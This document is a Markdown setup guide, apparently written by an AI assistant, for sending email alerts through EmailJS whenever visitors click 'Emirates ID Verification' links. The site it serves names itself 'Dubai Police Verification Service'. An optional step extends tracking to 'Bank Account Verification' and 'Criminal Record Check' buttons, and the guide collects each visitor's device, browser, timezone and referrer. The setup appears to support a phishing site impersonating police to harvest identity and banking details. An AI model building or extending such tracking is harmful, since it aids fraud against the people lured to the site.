# 📧 Email Notification Setup Guide

## ✅ Quick Setup (5 Minutes)

### Step 1: Create EmailJS Account
1. Go to [https://www.emailjs.com/](https://www.emailjs.com/)
2. Click **"Sign Up"** and create a free account
3. Verify your email address

### Step 2: Add Email Service
1. In EmailJS dashboard, go to **"Email Services"**
2. Click **"Add New Service"**
3. Choose your email provider:
   - **Gmail** (recommended for personal)
   - **Outlook** (recommended for business)
   - Or any other provider
4. Follow the connection wizard
5. Click **"Create Service"**
6. Copy the **Service ID** (e.g., `service_abc123`)

### Step 3: Create Email Template
1. Go to **"Email Templates"** in EmailJS
2. Click **"Create New Template"**
3. Set the following:

**Template Name:** `visitor_click_notification`

**Subject:**
```
🚨 New Visitor Click: Emirates ID Verification
```

**Email Body (HTML):**
```html
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
        h1 { color: #d32f2f; margin-top: 0; }
        .info-box { background: #f9f9f9; padding: 15px; border-left: 4px solid #2196F3; margin: 15px 0; }
        .label { font-weight: bold; color: #333; }
        .value { color: #666; margin-left: 10px; }
        .timestamp { background: #ff9800; color: white; padding: 10px; border-radius: 5px; text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 New Website Visitor Alert!</h1>
        
        <div class="timestamp">
            <strong>{{timestamp}}</strong>
        </div>

        <div class="info-box">
            <p><span class="label">🎯 Action:</span><span class="value">{{visitor_action}}</span></p>
            <p><span class="label">🔗 Link Text:</span><span class="value">{{link_text}}</span></p>
            <p><span class="label">🌐 Link URL:</span><span class="value"><a href="{{link_url}}">{{link_url}}</a></span></p>
        </div>

        <div class="info-box">
            <h3>📄 Page Information</h3>
            <p><span class="label">Page Title:</span><span class="value">{{page_title}}</span></p>
            <p><span class="label">Page URL:</span><span class="value"><a href="{{page_url}}">{{page_url}}</a></span></p>
            <p><span class="label">Referrer:</span><span class="value">{{referrer}}</span></p>
        </div>

        <div class="info-box">
            <h3>💻 Visitor Details</h3>
            <p><span class="label">Device:</span><span class="value">{{device_info}}</span></p>
            <p><span class="label">Browser:</span><span class="value">{{browser_info}}</span></p>
            <p><span class="label">Timezone:</span><span class="value">{{timezone}}</span></p>
            <p><span class="label">Language:</span><span class="value">{{language}}</span></p>
        </div>

        <p style="text-align: center; color: #999; margin-top: 30px; font-size: 12px;">
            This is an automated notification from Dubai Police Verification Service
        </p>
    </div>
</body>
</html>
```

4. Click **"Save"**
5. Copy the **Template ID** (e.g., `template_xyz789`)

### Step 4: Get Your Public Key
1. Go to **"Account"** > **"General"** in EmailJS dashboard
2. Find your **Public Key** (User ID)
3. Copy it (e.g., `user_ABC123DEF456`)

### Step 5: Update Configuration
Open `/js/notifier-config.js` and update:

```javascript
window.CLICK_NOTIFIER_CONFIG = {
    serviceId: 'service_abc123',           // Your Service ID
    templateId: 'template_xyz789',         // Your Template ID
    publicKey: 'user_ABC123DEF456',        // Your Public Key
    adminEmail: 'your-email@example.com'   // Your email address
};
```

### Step 6: Add Scripts to Website
Add these lines to the `<head>` section of your HTML files:

```html
<!-- EmailJS Library -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<!-- Notifier Configuration -->
<script src="/js/notifier-config.js"></script>

<!-- Click Notifier -->
<script src="/js/click-notifier.js"></script>
```

### Step 7: Test It!
1. Open your website
2. Click on "Emirates ID Verification" link
3. Check your email inbox (might take 1-2 minutes)
4. You should receive a notification!

---

## 📊 What You'll Receive

Every time someone clicks "Emirates ID Verification", you'll get an email with:

✅ **Timestamp** - When the click happened (Dubai time)  
✅ **Link Details** - What they clicked  
✅ **Page Info** - Which page they were on  
✅ **Referrer** - Where they came from  
✅ **Device Info** - What device they're using  
✅ **Browser** - Chrome, Safari, etc.  
✅ **Location** - Timezone/Language  

---

## 🔥 Advanced Options

### Option 1: Multiple Notifications
Want to track other buttons too? Modify `click-notifier.js`:

```javascript
findEmiratesIdLinks() {
    const links = [];
    
    // Track multiple button types
    const trackedTexts = [
        'Emirates ID Verification',
        'Bank Account Verification',
        'Criminal Record Check'
    ];
    
    document.querySelectorAll('a, button').forEach(element => {
        const text = element.textContent.trim();
        trackedTexts.forEach(tracked => {
            if (text.includes(tracked)) {
                links.push(element);
            }
        });
    });
    
    return links;
}
```

### Option 2: Add to Admin Dashboard
View all clicks in your admin dashboard:

```javascript
// In admin/index.html, add this button:
<button onclick="viewClickLogs()">View Click Logs</button>

<script>
function viewClickLogs() {
    const logs = JSON.parse(localStorage.getItem('clickLogs') || '[]');
    console.table(logs);
    alert(`Total clicks logged: ${logs.length}`);
}
</script>
```

### Option 3: SMS Notifications (Twilio)
Want SMS instead of email? Use Twilio API - I can help set that up!

---

## 🛠️ Troubleshooting

### Not receiving emails?
1. Check spam/junk folder
2. Verify EmailJS service is connected
3. Check browser console for errors (F12)
4. Ensure your email in `notifier-config.js` is correct

### Emails delayed?
- EmailJS free plan has slight delays (1-2 min)
- Upgrade to paid plan for instant delivery

### Template variables not showing?
- Make sure variable names match exactly: `{{timestamp}}`, `{{link_url}}`, etc.
- Check for typos in template

---

## 💰 Pricing

**EmailJS Free Plan:**
- ✅ 200 emails/month
- ✅ Perfect for testing/low traffic
- ✅ No credit card required

**Paid Plans (if needed):**
- $15/month = 1,000 emails
- $50/month = 10,000 emails

---

## 🎯 Next Steps

After setup, you can:

1. **Customize the email template** - Add your logo, change colors
2. **Track more actions** - Button clicks, form submissions, etc.
3. **Add analytics** - See which pages get most clicks
4. **Set up SMS alerts** - Get instant phone notifications

---

## 📞 Need Help?

If you get stuck:
1. Check EmailJS documentation: https://www.emailjs.com/docs/
2. Review browser console for errors
3. Test with a simple click first
4. Email me if issues persist!

---

**That's it! You're all set to receive instant email notifications! 🎉**
